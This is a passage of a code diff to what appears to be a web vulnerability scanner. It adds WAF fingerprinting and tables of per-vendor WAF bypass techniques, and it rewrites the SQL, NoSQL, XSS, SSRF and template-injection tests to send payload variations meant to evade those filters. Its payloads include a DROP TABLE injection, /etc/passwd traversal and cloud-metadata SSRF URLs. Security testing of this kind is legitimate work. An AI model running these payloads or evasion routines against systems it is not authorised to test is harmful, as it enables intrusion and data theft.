+            cookie_patterns=[re.compile(r'barra_counter_session', re.I)],
+            body_patterns=[re.compile(r'barracuda', re.I)],
+        ),
+        WAFSignature(
+            name="Citrix NetScaler",
+            headers={
+                "server": "netscaler",
+                "vi-id": "",
+            },
+            status_codes=[403],
+            cookie_patterns=[re.compile(r'ns_af=', re.I), re.compile(r'citrix_ns_id', re.I),
+                           re.compile(r'NSC_', re.I)],
+            body_patterns=[
+                re.compile(r'The requested URL was rejected.*consult.*administrator', re.I),
+            ],
+        ),
+        WAFSignature(
+            name="DDoS-Guard",
+            headers={
+                "server": "ddos-guard",
+            },
+            status_codes=[403, 429],
+            cookie_patterns=[re.compile(r'__ddg1_', re.I), re.compile(r'__ddgid', re.I)],
+            body_patterns=[re.compile(r'ddos-guard', re.I)],
+        ),
+        WAFSignature(
+            name="FortiWeb",
+            headers={
+                "server": "fortigate|fortiweb",
+                "x-powered-by": "fortiweb",
+            },
+            status_codes=[403],
+            cookie_patterns=[re.compile(r'FORTIWAFSID', re.I)],
+            body_patterns=[re.compile(r'web filter violation', re.I), re.compile(r'fortiweb', re.I)],
+        ),
+        WAFSignature(
+            name="Palo Alto Networks",
+            headers={
+                "x-phx": "",
+            },
+            status_codes=[403],
+            body_patterns=[
+                re.compile(r'Virus/Spyware Download Blocked', re.I),
+                re.compile(r'Palo Alto', re.I),
+            ],
+        ),
+        WAFSignature(
+            name="Sophos WAF",
+            headers={
+                "x-sophos-waf-id": "",
+            },
+            status_codes=[403],
+            cookie_patterns=[re.compile(r'sophos_waf_id', re.I)],
+            body_patterns=[
+                re.compile(r'UTM Web Protection', re.I),
+                re.compile(r'Sophos Firewall', re.I),
+            ],
+        ),
+        WAFSignature(
+            name="Fastly",
+            headers={
+                "via": "fastly",
+                "x-served-by": "cache-.*-fastly",
+            },
+            status_codes=[403],
+        ),
+        WAFSignature(
+            name="Varnish",
+            headers={
+                "server": "varnish",
+                "x-varnish": "",
+                "via": "varnish",
+            },
+            status_codes=[403],
+        ),
+        WAFSignature(
+            name="LiteSpeed",
+            headers={
+                "server": "litespeed",
+                "x-litespeed-cache": "",
+            },
+            status_codes=[403],
+            body_patterns=[re.compile(r'LiteSpeed', re.I), re.compile(r'Access forbidden by rule', re.I)],
+        ),
+        WAFSignature(
+            name="Generic WAF",
+            headers={},
+            status_codes=[403, 406, 429],
+            body_patterns=[
+                re.compile(r'request.*(blocked|rejected|filtered).*by', re.I),
+                re.compile(r'web.*(firewall|application firewall|waf)', re.I),
+                re.compile(r'malicious.*request|suspicious.*activity|attack.*detected', re.I),
+            ],
+        ),
+    ]
+    
+    # WAF-specific bypass techniques
+    BYPASS_TECHNIQUES: dict[str, list[str]] = {
+        "Cloudflare": [
+            "Unicode encoding (\\u0027 instead of ')",
+            "Double URL encoding (%2527 instead of %27)",
+            "Mixed case keywords (uNiOn instead of UNION)",
+            "Alternative space characters (\\u00A0)",
+            "Comment-based obfuscation (/**/)",
+        ],
+        "AWS WAF": [
+            "Unicode normalization bypasses",
+            "Character set encoding variations",
+            "Request method variations",
+            "Content-Type manipulation",
+        ],
+        "Imperva": [
+            "Parameter pollution",
+            "HTTP verb tampering",
+            "Custom header injection",
+            "Encoding combinations",
+        ],
+        "F5 BIG-IP": [
+            "Request smuggling techniques",
+            "HTTP/1.0 downgrade",
+            "Custom User-Agent strings",
+        ],
+        "ModSecurity": [
+            "Comment-based SQL obfuscation (/**/)",
+            "Case sensitivity exploits",
+            "Regex pattern bypasses",
+            "Alternative operators",
+        ],
+        "Akamai": [
+            "IP-based bypasses",
+            "Origin server direct access",
+            "Cache poisoning techniques",
+        ],
+        "Azure Front Door": [
+            "Case variations for SQL keywords",
+            "Parameter pollution (duplicate params)",
+            "Unicode encoding variations",
+            "CRLF injection in headers",
+        ],
+        "Google Cloud Armor": [
+            "Advanced request smuggling",
+            "Complex encoding combinations",
+            "Custom header injection (X-Forwarded-For)",
+            "Path normalization bypasses",
+        ],
+        "Wordfence": [
+            "Alternative SQL comment syntax (/*#*/)",
+            "Base64 payload encoding",
+            "PHP variable manipulation",
+            "HTTP parameter pollution",
+        ],
+        "Generic WAF": [
+            "Double URL encoding",
+            "Unicode encoding",
+            "Mixed case obfuscation",
+            "Comment insertion",
+            "Parameter pollution",
+            "HTTP verb tampering",
+        ],
+    }
+    
+    @classmethod
+    def detect_from_response(cls, headers: dict[str, str], body: str, 
+                            status_code: int, cookies: str = "") -> WAFDetectionResult:
+        """Detect WAF from HTTP response."""
+        best_match = {
+            "name": "Unknown",
+            "confidence": 0,
+            "evidence": [],
+        }
+        
+        # Check for captcha
+        captcha_detected = ""
+        if "challenges.cloudflare.com/turnstile" in body:
+            captcha_detected = "Cloudflare Turnstile"
+        elif "google.com/recaptcha" in body:
+            captcha_detected = "Google reCAPTCHA"
+        elif "hcaptcha.com" in body:
+            captcha_detected = "hCaptcha"
+        
+        # Check each signature
+        for sig in cls.WAF_SIGNATURES:
+            confidence = 0
+            evidence = []
+            
+            # Check headers
+            for header_name, pattern in sig.headers.items():
+                header_value = headers.get(header_name.lower(), "")
+                if header_value:
+                    if isinstance(pattern, str):
+                        if pattern == "" or pattern.lower() in header_value.lower():
+                            confidence += 30
+                            evidence.append(f"Header {header_name}: {header_value[:50]}")
+                    elif isinstance(pattern, re.Pattern):
+                        if pattern.search(header_value):
+                            confidence += 30
+                            evidence.append(f"Header {header_name} matches pattern")
+            
+            # Check status codes
+            if sig.status_codes and status_code in sig.status_codes:
+                confidence += 20
+                evidence.append(f"Status code: {status_code}")
+            
+            # Check cookies
+            if sig.cookie_patterns and cookies:
+                for pattern in sig.cookie_patterns:
+                    if pattern.search(cookies):
+                        confidence += 25
+                        evidence.append(f"Cookie pattern match: {pattern.pattern[:30]}")
+            
+            # Check body patterns
+            if sig.body_patterns:
+                for pattern in sig.body_patterns:
+                    if pattern.search(body):
+                        confidence += 25
+                        evidence.append(f"Body pattern match: {pattern.pattern[:40]}")
+            
+            # Update best match
+            if confidence > best_match["confidence"]:
+                best_match = {
+                    "name": sig.name,
+                    "confidence": confidence,
+                    "evidence": evidence,
+                }
+        
+        detected = best_match["confidence"] > 40
+        bypass_techniques = cls.BYPASS_TECHNIQUES.get(
+            best_match["name"], cls.BYPASS_TECHNIQUES["Generic WAF"]
+        )
+        
+        return WAFDetectionResult(
+            detected=detected,
+            waf_type=best_match["name"] if detected else "Unknown",
+            confidence=best_match["confidence"] / 100.0,
+            evidence=best_match["evidence"],
+            bypass_techniques=bypass_techniques,
+            captcha_detected=captcha_detected,
+        )
+    
+    @classmethod
+    def get_probe_payloads(cls) -> list[str]:
+        """Get payloads to probe for WAF detection."""
+        return [
+            "' OR '1'='1",
+            "<script>alert(1)</script>",
+            "../../../etc/passwd",
+            "UNION SELECT 1,2,3--",
+            "{{7*7}}",
+        ]
+    
+    @classmethod
+    def get_supported_wafs(cls) -> list[str]:
+        """Get list of supported WAF types."""
+        return [sig.name for sig in cls.WAF_SIGNATURES if sig.name != "Generic WAF"]
+
+
 class ActiveScanner:
     """Active scanner for real target reconnaissance and vulnerability testing."""
     
@@ -115,6 +1376,7 @@ class ActiveScanner:
         self._baselines: dict[str, BaselineResponse] = {}  # Cache baselines per endpoint
         self._protected_endpoints: list[str] = []  # Endpoints requiring auth
         self._filtered_false_positives: list[dict] = []  # Track what was filtered
+        self._detected_waf: WAFDetectionResult | None = None  # Detected WAF for bypass payloads
         
         # Initialize MISP Warning List Filter for false positive reduction
         if HAS_WARNING_FILTER:
@@ -136,6 +1398,43 @@ class ActiveScanner:
         """Print verbose log."""
         if self.verbose:
             print(f"    {message}")
+    
+    def _get_waf_bypass_payloads(self, original_payload: str, attack_type: str = "generic") -> list[str]:
+        """
+        Generate WAF bypass variations for a payload.
+        
+        If a WAF is detected, generates WAF-specific bypass payloads.
+        Otherwise, returns basic encoding variations.
+        
+        Args:
+            original_payload: The original attack payload
+            attack_type: Type of attack (sqli, xss, etc.)
+        
+        Returns:
+            List of bypass payload variations including original
+        """
+        payloads = [original_payload]
+        
+        if self._detected_waf and self._detected_waf.detected:
+            # Get WAF-specific bypasses
+            waf_bypasses = WAFBypasses.get_waf_specific_bypasses(
+                self._detected_waf.waf_type, 
+                original_payload
+            )
+            payloads.extend(waf_bypasses)
+        
+        # Always add some generic bypasses
+        payloads.extend(PayloadEncoder.generate_bypass_variations(original_payload, attack_type))
+        
+        # Remove duplicates while preserving order
+        seen = set()
+        unique_payloads = []
+        for p in payloads:
+            if p not in seen:
+                seen.add(p)
+                unique_payloads.append(p)
+        
+        return unique_payloads[:15]  # Limit to avoid too many requests
     
     def _check_false_positive(self, indicator: str, indicator_type: str = "auto") -> tuple[bool, str]:
         """
@@ -424,11 +1723,21 @@ class ActiveScanner:
         tech_stack = self._detect_tech_stack(target_url)
         endpoints = self._discover_endpoints(target_url)
         
+        # Phase 1.5: WAF Detection
+        if self.verbose:
+            print("\n[*] Phase 1.5: WAF Detection...")
+        waf_result = self._detect_waf(target_url)
+        self._detected_waf = waf_result  # Store for use in vulnerability tests
+        
         if self.verbose:
             print(f"    Server: {tech_stack.server or 'Unknown'}")
             print(f"    Framework: {tech_stack.framework or 'Unknown'}")
             print(f"    Language: {tech_stack.language or 'Unknown'}")
             print(f"    Database: {tech_stack.database or 'Unknown'}")
+            if waf_result.detected:
+                print(f"    WAF: {waf_result.waf_type} (confidence: {waf_result.confidence:.0%})")
+            else:
+                print(f"    WAF: Not detected")
             print(f"    Endpoints found: {len(endpoints)}")
         
         # Phase 2: Smart Test Selection based on Tech Stack
@@ -698,6 +2007,60 @@ class ActiveScanner:
         
         return results
     
+    def _detect_waf(self, base_url: str) -> WAFDetectionResult:
+        """Detect WAF protecting the target."""
+        self._log("[WAF] Starting WAF detection...")
+        
+        # First, get baseline response
+        baseline_resp = self._make_request("GET", base_url)
+        
+        # Check baseline for WAF signatures
+        cookies = baseline_resp.headers.get("Set-Cookie", "")
+        baseline_detection = WAFDetector.detect_from_response(
+            baseline_resp.headers, 
+            baseline_resp.body,
+            baseline_resp.status_code,
+            cookies
+        )
+        
+        if baseline_detection.detected:
+            self._log(f"[WAF] Detected from baseline: {baseline_detection.waf_type} "
+                     f"(confidence: {baseline_detection.confidence:.0%})")
+            return baseline_detection
+        
+        # Send probe payloads to trigger WAF
+        best_detection = baseline_detection
+        probe_payloads = WAFDetector.get_probe_payloads()
+        
+        for payload in probe_payloads:
+            test_url = f"{base_url}/?test={urllib.parse.quote(payload)}"
+            resp = self._make_request("GET", test_url)
+            cookies = resp.headers.get("Set-Cookie", "")
+            
+            detection = WAFDetector.detect_from_response(
+                resp.headers,
+                resp.body,
+                resp.status_code,
+                cookies
+            )
+            
+            if detection.detected and detection.confidence > best_detection.confidence:
+                best_detection = detection
+                self._log(f"[WAF] Detected via probe: {detection.waf_type} "
+                         f"(confidence: {detection.confidence:.0%})")
+        
+        if best_detection.detected:
+            self._log(f"[WAF] WAF detected: {best_detection.waf_type}")
+            if best_detection.captcha_detected:
+                self._log(f"[WAF] Captcha detected: {best_detection.captcha_detected}")
+            self._log(f"[WAF] Suggested bypass techniques:")
+            for technique in best_detection.bypass_techniques[:3]:
+                self._log(f"      - {technique}")
+        else:
+            self._log("[WAF] No WAF detected (or using transparent mode)")
+        
+        return best_detection
+    
     def _detect_tech_stack(self, base_url: str) -> TechStack:
         """Detect technology stack from headers and responses."""
         resp = self._make_request("GET", base_url)
@@ -849,7 +2212,7 @@ class ActiveScanner:
         return list(set(params))
     
     def _test_nosql_injection(self, endpoint: EndpointInfo) -> list[VulnTestResult]:
-        """Test for NoSQL injection vulnerabilities with proper verification."""
+        """Test for NoSQL injection vulnerabilities with interactive validation."""
         results = []
         
         if endpoint.method != "POST":
@@ -858,52 +2221,92 @@ class ActiveScanner:
         # Get baseline first
         baseline = self._capture_baseline(endpoint.url)
         base_url = endpoint.url.rsplit('/', 1)[0].rsplit('/login', 1)[0].rsplit('/auth', 1)[0]
-            
-        payloads = [
-            # MongoDB operator injection
-            {"$gt": ""},
-            {"$ne": None},
-            {"$ne": ""},
-            {"$exists": True},
-            {"$regex": ".*"},
-            {"$where": "1==1"},
-            # Array injection
-            {"$in": ["admin", "root", "administrator"]},
-        ]
         
-        for payload in payloads:
+        # Get interactive payloads from validator
+        interactive_payloads = InteractiveValidator.get_nosql_payloads()
+        
+        # WAF info logging
+        waf_info = ""
+        if self._detected_waf and self._detected_waf.detected:
+            waf_info = f" (WAF: {self._detected_waf.waf_type})"
+        
+        self._log(f"[NoSQLi] Testing {len(interactive_payloads)} interactive payloads on {endpoint.url}{waf_info}")
+        
+        for ipayload in interactive_payloads:
+            # Parse payload string to dict if needed
+            try:
+                payload_dict = json.loads(ipayload.payload) if isinstance(ipayload.payload, str) else ipayload.payload
+            except:
+                payload_dict = ipayload.payload
+            
             # Build request with payload in common auth fields
             test_data = {}
             for field in ["username", "email", "user", "login"]:
-                test_data[field] = payload
+                test_data[field] = payload_dict
             for field in ["password", "pass", "pwd"]:
-                test_data[field] = payload
+                test_data[field] = payload_dict
                 
             resp = self._make_request("POST", endpoint.url, json_data=test_data)
             
-            # Compare with baseline
-            comparison = self._compare_with_baseline(baseline, resp)
-            
-            # Analyze response for success indicators
-            is_vuln, confidence, evidence = self._analyze_nosql_response_v2(
-                resp, payload, baseline, comparison, base_url
+            # Use InteractiveValidator for primary validation
+            is_vuln, confidence, evidence = InteractiveValidator.validate_response(
+                ipayload,
+                resp.body,
+                resp.elapsed_ms,
+                resp.status_code
             )
             
-            if is_vuln or confidence > 0.3:
+            # If interactive validation passes, it's confirmed
+            if is_vuln:
+                self._log(f"[!] CONFIRMED NoSQL Injection via {ipayload.validation_type}!")
+                
+                # Additional token validation for auth_bypass type
+                if ipayload.validation_type == "auth_bypass":
+                    token = self._extract_token(resp)
+                    if token:
+                        is_valid, validation_msg = self._validate_token(base_url, token)
+                        if is_valid:
+                            evidence = f"[CONFIRMED] NoSQL auth bypass - Token validated: {validation_msg}"
+                            confidence = 0.98
+                        else:
+                            evidence = f"[LIKELY] Auth bypass - Token found but not validated: {validation_msg}"
+                            confidence = 0.80
+                
                 results.append(VulnTestResult(
-                    vuln_type="NoSQL Injection",
-                    payload=json.dumps(payload),
+                    vuln_type=f"NoSQL Injection ({ipayload.validation_type})",
+                    payload=json.dumps(payload_dict),
                     target_url=endpoint.url,
                     request_data=json.dumps(test_data),
                     response=resp,
-                    is_vulnerable=is_vuln,
+                    is_vulnerable=True,
                     confidence=confidence,
                     evidence=evidence,
+                    evidence_hash=self._hash_evidence(f"{ipayload.validation_type}:{resp.status_code}:{resp.elapsed_ms}")
+                ))
+                break  # Found confirmed vuln
+            
+            # Fallback to baseline comparison for uncertain cases
+            comparison = self._compare_with_baseline(baseline, resp)
+            fallback_vuln, fallback_conf, fallback_evidence = self._analyze_nosql_response_v2(
+                resp, payload_dict, baseline, comparison, base_url
+            )
+            
+            if fallback_vuln or fallback_conf > 0.5:
+                self._log(f"[~] NoSQLi detected via baseline comparison: {fallback_evidence[:50]}...")
+                results.append(VulnTestResult(
+                    vuln_type="NoSQL Injection (baseline)",
+                    payload=json.dumps(payload_dict),
+                    target_url=endpoint.url,
+                    request_data=json.dumps(test_data),
+                    response=resp,
+                    is_vulnerable=fallback_vuln,
+                    confidence=fallback_conf,
+                    evidence=fallback_evidence,
                     evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                 ))
                 
-                if is_vuln:
-                    break  # Found confirmed vuln, no need to test more
+                if fallback_vuln:
+                    break
                     
         return results
     
@@ -975,51 +2378,76 @@ class ActiveScanner:
         return False, 0.2, f"No clear indicators. Status: {resp.status_code}, Baseline: {baseline.status_code}"
     
     def _test_sql_injection(self, endpoint: EndpointInfo) -> list[VulnTestResult]:
-        """Test for SQL injection vulnerabilities."""
+        """Test for SQL injection vulnerabilities using interactive payloads with WAF bypass."""
         results = []
         
-        payloads = [
-            "' OR '1'='1",
-            "' OR '1'='1' --",
-            "' OR '1'='1' #",
-            "admin'--",
-            "1' OR '1'='1",
-            "1 OR 1=1",
-            "' UNION SELECT NULL--",
-            "'; DROP TABLE users--",
-            "1; WAITFOR DELAY '0:0:5'--",
-            "1' AND SLEEP(5)#",
-        ]
+        # Get interactive payloads from validator
+        interactive_payloads = InteractiveValidator.get_sqli_payloads()
         
-        for payload in payloads:
-            if endpoint.method == "POST":
-                test_data = {
-                    "username": payload,
-                    "password": payload,
-                }
-                resp = self._make_request("POST", endpoint.url, json_data=test_data)
-            else:
-                # GET with query params
-                url = f"{endpoint.url}?id={urllib.parse.quote(payload)}"
-                resp = self._make_request("GET", url)
+        # Generate WAF bypass variations if WAF detected
+        waf_info = ""
+        if self._detected_waf and self._detected_waf.detected:
+            waf_info = f" (WAF: {self._detected_waf.waf_type}, adding bypass payloads)"
+        
+        self._log(f"[SQLi] Testing {len(interactive_payloads)} interactive payloads on {endpoint.url}{waf_info}")
+        
+        for ipayload in interactive_payloads:
+            # Generate WAF bypass variations for this payload
+            payload_variations = self._get_waf_bypass_payloads(ipayload.payload, "sqli")
             
-            is_vuln, confidence, evidence = self._analyze_sqli_response(resp, payload)
-            
-            if is_vuln or confidence > 0.3:
-                results.append(VulnTestResult(
-                    vuln_type="SQL Injection",
-                    payload=payload,
-                    target_url=endpoint.url,
-                    request_data=json.dumps(test_data) if endpoint.method == "POST" else url,
-                    response=resp,
-                    is_vulnerable=is_vuln,
-                    confidence=confidence,
-                    evidence=evidence,
-                    evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
-                ))
+            for test_payload in payload_variations:
+                if endpoint.method == "POST":
+                    test_data = {
+                        "username": test_payload,
+                        "password": test_payload,
+                    }
+                    resp = self._make_request("POST", endpoint.url, json_data=test_data)
+                    request_str = json.dumps(test_data)
+                else:
+                    # GET with query params
+                    url = f"{endpoint.url}?id={urllib.parse.quote(test_payload)}"
+                    resp = self._make_request("GET", url)
+                    request_str = url
+                
+                # Use InteractiveValidator to validate response
+                is_vuln, confidence, evidence = InteractiveValidator.validate_response(
+                    ipayload,
+                    resp.body,
+                    resp.elapsed_ms,
+                    resp.status_code
+                )
+                
+                # Log validation result
+                bypass_note = " (bypass)" if test_payload != ipayload.payload else ""
+                self._log(f"[SQLi] {ipayload.validation_type}{bypass_note}: {evidence[:60]}...")
                 
                 if is_vuln:
-                    break
+                    self._log(f"[!] CONFIRMED SQL INJECTION via {ipayload.validation_type}!")
+                    results.append(VulnTestResult(
+                        vuln_type=f"SQL Injection ({ipayload.validation_type})",
+                        payload=test_payload,
+                        target_url=endpoint.url,
+                        request_data=request_str,
+                        response=resp,
+                        is_vulnerable=True,
+                        confidence=confidence,
+                        evidence=f"[CONFIRMED] {evidence}",
+                        evidence_hash=self._hash_evidence(f"{ipayload.canary}:{resp.status_code}:{resp.elapsed_ms}")
+                    ))
+                    # Found confirmed vuln, stop testing this endpoint
+                    return results
+                elif confidence > 0.3:
+                    results.append(VulnTestResult(
+                        vuln_type=f"SQL Injection ({ipayload.validation_type})",
+                        payload=test_payload,
+                        target_url=endpoint.url,
+                        request_data=request_str,
+                        response=resp,
+                        is_vulnerable=False,
+                        confidence=confidence,
+                        evidence=f"[UNCONFIRMED] {evidence}",
+                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
+                    ))
                     
         return results
     
@@ -1268,84 +2696,110 @@ class ActiveScanner:
         return results
     
     def _test_xss(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
-        """Test for XSS vulnerabilities."""
+        """Test for XSS vulnerabilities using interactive canary-based validation with WAF bypass."""
         results = []
         
-        payloads = [
-            '<script>alert(1)</script>',
-            '"><script>alert(1)</script>',
-            "'-alert(1)-'",
-            '<img src=x onerror=alert(1)>',
-            '{{constructor.constructor("alert(1)")()}}',  # Template injection
-        ]
+        # Get interactive payloads from validator
+        interactive_payloads = InteractiveValidator.get_xss_payloads()
+        
+        # WAF info logging
+        waf_info = ""
+        if self._detected_waf and self._detected_waf.detected:
+            waf_info = f" (WAF: {self._detected_waf.waf_type})"
+        
+        self._log(f"[XSS] Testing {len(interactive_payloads)} interactive payloads{waf_info}")
         
         # Test on endpoints that might reflect input
-        test_urls = [
-            f"{base_url}/search?q=",
-            f"{base_url}/api/search?query=",
-            f"{base_url}/?name=",
-            f"{base_url}/?redirect=",
-        ]
+        test_params = ["q", "query", "search", "name", "redirect", "callback", "url", "input", "text"]
         
-        for test_url in test_urls:
-            for payload in payloads:
-                url = f"{test_url}{urllib.parse.quote(payload)}"
-                resp = self._make_request("GET", url)
+        for param in test_params:
+            for ipayload in interactive_payloads:
+                # Generate WAF bypass variations
+                payload_variations = self._get_waf_bypass_payloads(ipayload.payload, "xss")
                 
-                # Check if payload is reflected
-                if payload in resp.body or payload.replace('"', '&quot;') in resp.body:
-                    results.append(VulnTestResult(
-                        vuln_type="Cross-Site Scripting (XSS)",
-                        payload=payload,
-                        target_url=url,
-                        request_data=url,
-                        response=resp,
-                        is_vulnerable=True,
-                        confidence=0.85,
-                        evidence=f"Payload reflected in response without encoding",
-                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
-                    ))
-                    break
+                for test_payload in payload_variations:
+                    url = f"{base_url}/?{param}={urllib.parse.quote(test_payload)}"
+                    resp = self._make_request("GET", url)
+                    
+                    # Use InteractiveValidator to validate response
+                    is_vuln, confidence, evidence = InteractiveValidator.validate_response(
+                        ipayload,
+                        resp.body,
+                        resp.elapsed_ms,
+                        resp.status_code
+                    )
+                    
+                    if is_vuln:
+                        bypass_note = " (bypass)" if test_payload != ipayload.payload else ""
+                        self._log(f"[!] CONFIRMED XSS{bypass_note} with canary {ipayload.canary[:20]}...")
+                        results.append(VulnTestResult(
+                            vuln_type="Cross-Site Scripting (XSS)",
+                            payload=test_payload,
+                            target_url=url,
+                            request_data=url,
+                            response=resp,
+                            is_vulnerable=True,
+                            confidence=confidence,
+                            evidence=f"[CONFIRMED] XSS canary reflected unencoded: {ipayload.canary[:20]}...",
+                            evidence_hash=self._hash_evidence(f"XSS:{ipayload.canary}:{resp.status_code}")
+                        ))
+                        return results  # Found confirmed
                     
         return results
     
     def _test_ssrf(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
-        """Test for SSRF vulnerabilities."""
+        """Test for SSRF vulnerabilities using interactive validation with WAF bypass."""
         results = []
         
-        # Common SSRF test URLs
-        ssrf_payloads = [
-            "http://127.0.0.1",
-            "http://localhost",
-            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
-        ]
+        # Get interactive payloads from validator
+        interactive_payloads = InteractiveValidator.get_ssrf_payloads()
+        
+        # WAF info logging
+        waf_info = ""
+        if self._detected_waf and self._detected_waf.detected:
+            waf_info = f" (WAF: {self._detected_waf.waf_type})"
+        
+        self._log(f"[SSRF] Testing {len(interactive_payloads)} interactive payloads{waf_info}")
         
         # Look for URL parameters
-        url_params = ["url", "redirect", "next", "target"]
+        url_params = ["url", "redirect", "next", "target", "fetch", "proxy", "uri", "img", "file", "document"]
         
         for param in url_params:
-            for payload in ssrf_payloads:
-                try:
-                    test_url = f"{base_url}/?{param}={urllib.parse.quote(payload)}"
-                    resp = self._make_request("GET", test_url)
-                    
-                    # Check for SSRF indicators
-                    if resp.status_code == 200:
-                        if any(x in resp.body.lower() for x in ["ami-id", "instance-id", "metadata", "127.0.0.1"]):
+            for ipayload in interactive_payloads:
+                # Generate WAF bypass variations for SSRF
+                payload_variations = self._get_waf_bypass_payloads(ipayload.payload, "ssrf")
+                
+                for test_payload in payload_variations:
+                    try:
+                        test_url = f"{base_url}/?{param}={urllib.parse.quote(test_payload)}"
+                        resp = self._make_request("GET", test_url)
+                        
+                        # Use InteractiveValidator to validate response
+                        is_vuln, confidence, evidence = InteractiveValidator.validate_response(
+                            ipayload,
+                            resp.body,
+                            resp.elapsed_ms,
+                            resp.status_code
+                        )
+                        
+                        if is_vuln:
+                            bypass_note = " (bypass)" if test_payload != ipayload.payload else ""
+                            self._log(f"[!] CONFIRMED SSRF{bypass_note}: Cloud metadata or internal response detected")
                             results.append(VulnTestResult(
                                 vuln_type="Server-Side Request Forgery (SSRF)",
-                                payload=payload,
+                                payload=test_payload,
                                 target_url=test_url,
                                 request_data=test_url,
                                 response=resp,
                                 is_vulnerable=True,
-                                confidence=0.9,
-                                evidence=f"Internal resource accessed via SSRF",
-                                evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
+                                confidence=confidence,
+                                evidence=f"[CONFIRMED] {evidence}",
+                                evidence_hash=self._hash_evidence(f"SSRF:{ipayload.canary}:{resp.status_code}")
                             ))
-                except Exception:
-                    # Skip on timeout/connection errors
-                    continue
+                            return results
+                    except Exception:
+                        # Skip on timeout/connection errors
+                        continue
                         
         return results
     
@@ -1353,250 +2807,250 @@ class ActiveScanner:
     
     def _test_ssti(self, base_url: str, endpoints: list[EndpointInfo], 
                    tech_stack: TechStack) -> list[VulnTestResult]:
-        """Test for Server-Side Template Injection."""
+        """Test for Server-Side Template Injection using interactive math-based validation."""
         results = []
         
-        # Framework-specific payloads
-        payloads_by_framework = {
-            "jinja2": [
-                ("{{7*7}}", "49"),
-                ("{{config}}", "SECRET_KEY"),
-                ("{{self.__class__.__mro__}}", "__class__"),
-            ],
-            "twig": [
-                ("{{7*7}}", "49"),
-                ("{{_self.env.getFilter}}", "getFilter"),
-            ],
-            "freemarker": [
-                ("${7*7}", "49"),
-                ("<#assign x=7*7>${x}", "49"),
-            ],
-            "velocity": [
-                ("#set($x=7*7)$x", "49"),
-            ],
-            "erb": [
-                ("<%= 7*7 %>", "49"),
-            ],
-            "generic": [
-                ("{{7*7}}", "49"),
-                ("${7*7}", "49"),
-                ("<%=7*7%>", "49"),
-                ("#{7*7}", "49"),
-                ("${{7*7}}", "49"),
-            ]
-        }
+        # Get interactive payloads from validator
+        interactive_payloads = InteractiveValidator.get_ssti_payloads()
         
-        # Select payloads based on detected framework
-        fw = (tech_stack.framework or "").lower()
-        lang = (tech_stack.language or "").lower()
+        # WAF info logging
+        waf_info = ""
+        if self._detected_waf and self._detected_waf.detected:
+            waf_info = f" (WAF: {self._detected_waf.waf_type})"
         
-        if "flask" in fw or "jinja" in fw or "python" in lang:
-            test_payloads = payloads_by_framework["jinja2"] + payloads_by_framework["generic"]
-        elif "php" in lang or "twig" in fw:
-            test_payloads = payloads_by_framework["twig"] + payloads_by_framework["generic"]
-        elif "java" in lang:
-            test_payloads = payloads_by_framework["freemarker"] + payloads_by_framework["velocity"] + payloads_by_framework["generic"]
-        elif "ruby" in lang:
-            test_payloads = payloads_by_framework["erb"] + payloads_by_framework["generic"]
-        else:
-            test_payloads = payloads_by_framework["generic"]
+        self._log(f"[SSTI] Testing {len(interactive_payloads)} interactive payloads{waf_info}")
         
         # Test parameters that might be rendered in templates
-        test_params = ["name", "title", "message", "template", "content", "text", "q", "search"]
+        test_params = ["name", "title", "message", "template", "content", "text", "q", "search", "input"]
         
         for param in test_params:
-            for payload, expected in test_payloads:
-                test_url = f"{base_url}/?{param}={urllib.parse.quote(payload)}"
-                resp = self._make_request("GET", test_url)
+            for ipayload in interactive_payloads:
+                # Generate WAF bypass variations
+                payload_variations = self._get_waf_bypass_payloads(ipayload.payload, "ssti")
                 
-                if expected in resp.body:
-                    self._log(f"[+] SSTI detected with payload: {payload}")
-                    results.append(VulnTestResult(
-                        vuln_type="Server-Side Template Injection (SSTI)",
-                        payload=payload,
-                        target_url=test_url,
-                        request_data=test_url,
-                        response=resp,
-                        is_vulnerable=True,
-                        confidence=0.95,
-                        evidence=f"Template expression evaluated: {payload} -> {expected}",
-                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
-                    ))
-                    return results  # Found confirmed
+                for test_payload in payload_variations:
+                    test_url = f"{base_url}/?{param}={urllib.parse.quote(test_payload)}"
+                    resp = self._make_request("GET", test_url)
+                    
+                    # Use InteractiveValidator to validate response
+                    is_vuln, confidence, evidence = InteractiveValidator.validate_response(
+                        ipayload,
+                        resp.body,
+                        resp.elapsed_ms,
+                        resp.status_code
+                    )
+                    
+                    if is_vuln:
+                        bypass_note = " (bypass)" if test_payload != ipayload.payload else ""
+                        self._log(f"[!] CONFIRMED SSTI{bypass_note} via math validation: {test_payload}")
+                        results.append(VulnTestResult(
+                            vuln_type="Server-Side Template Injection (SSTI)",
+                            payload=test_payload,
+                            target_url=test_url,
+                            request_data=test_url,
+                            response=resp,
+                            is_vulnerable=True,
+                            confidence=confidence,
+                            evidence=f"[CONFIRMED] Math expression evaluated: {test_payload} = {ipayload.canary}",
+                            evidence_hash=self._hash_evidence(f"SSTI:{ipayload.canary}:{resp.status_code}")
+                        ))
+                        return results  # Found confirmed
         
         # Test POST endpoints
         for endpoint in endpoints:
             if endpoint.method == "POST":
-                for payload, expected in test_payloads[:3]:  # Limit payloads
-                    data = {p: payload for p in endpoint.parameters[:2]} if endpoint.parameters else {"input": payload}
-                    resp = self._make_request("POST", endpoint.url, json_data=data)
+                for ipayload in interactive_payloads[:3]:  # Limit payloads
+                    # Generate WAF bypass variations for POST
+                    payload_variations = self._get_waf_bypass_payloads(ipayload.payload, "ssti")[:3]
                     
-                    if expected in resp.body:
+                    for test_payload in payload_variations:
+                        data = {p: test_payload for p in endpoint.parameters[:2]} if endpoint.parameters else {"input": test_payload}
+                        resp = self._make_request("POST", endpoint.url, json_data=data)
+                        
+                        is_vuln, confidence, evidence = InteractiveValidator.validate_response(
+                            ipayload,
+                            resp.body,
+                            resp.elapsed_ms,
+                            resp.status_code
+                        )
+                        
+                        if is_vuln:
+                            bypass_note = " (bypass)" if test_payload != ipayload.payload else ""
